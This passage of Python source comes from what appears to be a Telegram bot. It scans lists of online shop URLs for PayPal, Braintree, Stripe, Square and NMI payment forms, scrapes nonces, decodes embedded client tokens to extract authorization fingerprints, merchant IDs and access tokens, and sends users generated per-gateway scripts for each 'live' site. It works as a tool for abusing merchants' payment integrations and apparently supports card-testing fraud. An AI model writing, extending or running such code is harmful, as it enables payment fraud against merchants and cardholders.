                if not all([id_form1, id_form2, nonec, anc]):
                    return None
                
                id_form1 = id_form1.group(1)
                id_form2 = id_form2.group(1)
                nonec = nonec.group(1)
                enc = anc.group(1)
                dec = base64.b64decode(enc).decode('utf-8')
                au = re.search(r'"accessToken":"(.*?)"', dec)
                if not au:
                    return None
                au = au.group(1)
                
                return {
                    'link': link,
                    'type': 'paypal',
                    'id_form1': id_form1,
                    'id_form2': id_form2,
                    'nonec': nonec,
                    'au': au
                }
            except:
                return None
        
        def extract_braintree_data(link, session):
            try:
                user = generate_user_agent()
                headers = {'user-agent': user}
                
                res = session.get(f"{link}/my-account/add-payment-method/", headers=headers, timeout=10)
                if res.status_code == 404:
                    res = session.get(f"{link}/add-payment-method/", headers=headers, timeout=10)
                if res.status_code == 404:
                    res = session.get(f"{link}/payment-method/", headers=headers, timeout=10)
                
                if res.status_code != 200:
                    return None
                
                html_text = res.text
                
                nonce_match = re.search(r'name="_wpnonce" value="(.*?)"', html_text)
                if not nonce_match:
                    nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', html_text)
                
                nonce = nonce_match.group(1) if nonce_match else None
                
                client_token_match = re.search(r'var wc_braintree_client_token[=:]\s*"([^"]+)"', html_text)
                if not client_token_match:
                    client_token_match = re.search(r'"clientToken":"([^"]+)"', html_text)
                
                auth = None
                merchant_id = None
                braintree_client_id = None
                
                if client_token_match:
                    client_token = client_token_match.group(1)
                    try:
                        decoded = base64.b64decode(client_token).decode('utf-8')
                        auth_match = re.search(r'"authorizationFingerprint":"([^"]+)"', decoded)
                        if auth_match:
                            auth = auth_match.group(1)
                        
                        merchant_match = re.search(r'"merchantId":"([^"]+)"', decoded)
                        if merchant_match:
                            merchant_id = merchant_match.group(1)
                        
                        client_id_match = re.search(r'"braintreeClientId":"([^"]+)"', decoded)
                        if client_id_match:
                            braintree_client_id = client_id_match.group(1)
                    except:
                        pass
                
                if not auth:
                    return None
                
                return {
                    'link': link,
                    'type': 'braintree',
                    'nonce': nonce,
                    'auth': auth,
                    'merchant_id': merchant_id,
                    'braintree_client_id': braintree_client_id
                }
            except:
                return None
        
        def check_link(link):
            try:
                if not link.startswith(("http://", "https://")):
                    return None
                
                session = requests.Session()
                
                # PayPal
                result = extract_paypal_data(link, session)
                if result:
                    return result
                
                # Braintree
                result = extract_braintree_data(link, session)
                if result:
                    return result
                
                # Stripe
                r = session.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
                if r.status_code == 200:
                    if 'pk_live_' in r.text or 'stripe' in r.text.lower():
                        return {
                            'link': link,
                            'type': 'stripe',
                        }
                
                # Square
                if 'square' in link.lower() or 'sq0idp' in r.text:
                    return {
                        'link': link,
                        'type': 'square',
                    }
                
                # NMI
                if 'nmi' in link.lower() or 'donorperfect' in link.lower():
                    return {
                        'link': link,
                        'type': 'nmi',
                    }
                
                return None
            except:
                return None
        
        stopped = False
        
        for idx, link in enumerate(links, 1):
            if user_id in stop_flags and file_num in stop_flags[user_id] and stop_flags[user_id][file_num]:
                stopped = True
                break
            
            result = check_link(link)
            
            with processing_status[f"{user_id}_{file_num}"]['lock']:
                processing_status[f"{user_id}_{file_num}"]['processed'] += 1
                
                if result:
                    processing_status[f"{user_id}_{file_num}"]['live'] += 1
                    live_count += 1
                    
                    try:
                        gateway_type = result.get('type', 'unknown')
                        
                        if gateway_type == 'paypal':
                            code = generate_paypal_code(result['link'], result['id_form1'], result['id_form2'], result['nonec'], result['au'])
                            gateway_name = 'PayPal'
                        elif gateway_type == 'braintree':
                            code = generate_braintree_code(result['link'], result.get('nonce'), result.get('auth'), result.get('merchant_id'), result.get('braintree_client_id'))
                            gateway_name = 'Braintree'
                        elif gateway_type == 'stripe':
                            code = generate_stripe_code(result['link'])
                            gateway_name = 'Stripe'
                        elif gateway_type == 'square':
                            code = generate_square_code()
                            gateway_name = 'Square'
                        elif gateway_type == 'nmi':
                            code = generate_nmi_code()
                            gateway_name = 'NMI'
                        else:
                            gateway_name = 'Unknown'
                            code = None
                        
                        if code:
                            file_name = f'{gateway_type}_{file_num}_{live_count}_{user_id}.py'
                            with open(file_name, 'w', encoding='utf-8') as f:
                                f.write(code)
                            with open(file_name, 'rb') as f:
                                bot.send_document(
                                    chat_id,
                                    f,
                                    caption=f"""✅ <b>File #{file_num} - {gateway_name} Gateway #{live_count}</b>
━━━━━━━━━━━━━━━━━━━━
🔗 Link: <code>{result['link']}</code>
🔐 Type: {gateway_name}
━━━━━━━━━━━━━━━━━━━━
Dev: @nnunrr""",
                                    parse_mode="HTML"
                                )
                            os.remove(file_name)
                            time.sleep(0.5)
                    except Exception as e:
                        print(f"Error sending file: {e}")
                else:
                    processing_status[f"{user_id}_{file_num}"]['dead'] += 1
                
                processed = processing_status[f"{user_id}_{file_num}"]['processed']
                live = processing_status[f"{user_id}_{file_num}"]['live']
                dead = processing_status[f"{user_id}_{file_num}"]['dead']
                progress = int((processed / total) * 100)
                
                if processed % 5 == 0 or processed == total:
                    bar_length = 20
                    filled = int((progress / 100) * bar_length)
                    bar = '█' * filled + '░' * (bar_length - filled)
                    
                    text = f"""📊 <b>File #{file_num} - Scanning links...</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Live: {live}
❌ Dead: {dead}
⏳ Progress: {progress}% {bar}
━━━━━━━━━━━━━━━━━━
⏱️ Checked {processed} of {total}
🛑 /stop {file_num} to stop this file"""
                    
                    try:
                        bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
                    except:
                        pass
            
            time.sleep(0.3)
        
        status = processing_status[f"{user_id}_{file_num}"]
        
        if stopped:
            final_text = f"""🛑 <b>File #{file_num} Stopped!</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Checked: {status['processed']}
✅ Live (Sent): {status['live']}
❌ Dead: {status['dead']}
━━━━━━━━━━━━━━━━━━
📁 Send another file or /done to finish."""
        else:
            if status['live'] > 0:
                final_text = f"""📊 <b>✅ File #{file_num} Complete!</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {status['total']}
✅ Live (Sent): {status['live']}
❌ Dead (Failed): {status['dead']}
💯 Success Rate: {int((status['live']/status['total'])*100) if status['total'] > 0 else 0}%
━━━━━━━━━━━━━━━━━━
📁 Send another file or /done to finish.
Dev: @nnunrr"""
            else:
                final_text = f"""📊 <b>❌ File #{file_num} - No live links found!</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {status['total']}
✅ Live: 0
❌ Dead: {status['dead']}
━━━━━━━━━━━━━━━━━━
📁 Send another file or /done to finish.
Dev: @nnunrr"""
        
        try:
            bot.edit_message_text(final_text, chat_id, status_msg.message_id, parse_mode="HTML")
        except:
            bot.send_message(chat_id, final_text, parse_mode="HTML")
        
        if f"{user_id}_{file_num}" in processing_status:
            del processing_status[f"{user_id}_{file_num}"]
        cleanup_memory()
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)[:100]}")
        cleanup_memory()


# ============================================
# === نظام الحظر ===
# ============================================
@bot.message_handler(commands=['block2'])
def block_user(message):
    if str(message.from_user.id) not in admins:
        bot.reply_to(message, "You do not have permission.")
        return
    try:
        user_id_to_block = message.text.split()[1]
        with open('blockusers.txt', 'a') as file:
            file.write(f"{user_id_to_block}\n")
        bot.reply_to(message, f"✅ User ID {user_id_to_block} blocked.")
    except:
        bot.reply_to(message, "Usage: /block2 [user_id]")

@bot.message_handler(commands=['unblock2'])
def unblock_user(message):
    if str(message.from_user.id) not in admins:
        bot.reply_to(message, "You do not have permission.")
        return
    try:
        user_id_to_unblock = message.text.split()[1]
        with open('blockusers.txt', 'r') as file:
            lines = file.readlines()
        with open('blockusers.txt', 'w') as file:
            for line in lines:
                if line.strip() != user_id_to_unblock:
                    file.write(line)
        bot.reply_to(message, f"✅ User ID {user_id_to_unblock} unblocked.")
    except:
        bot.reply_to(message, "Usage: /unblock2 [user_id]")


# ============================================
# === تشغيل البوت ===
# ============================================
print('✅ Bot is running...')
print('✅ 5 Gateways Loaded: PayPal, Stripe, Square, NMI, Braintree')
print('✅ Bulk Mode Supports All Gateways')
while True:
    try:
        bot.infinity_polling(none_stop=True, interval=0, timeout=20)
    except Exception as e:
        print(f'❌ Error: {e}')
        time.sleep(5)
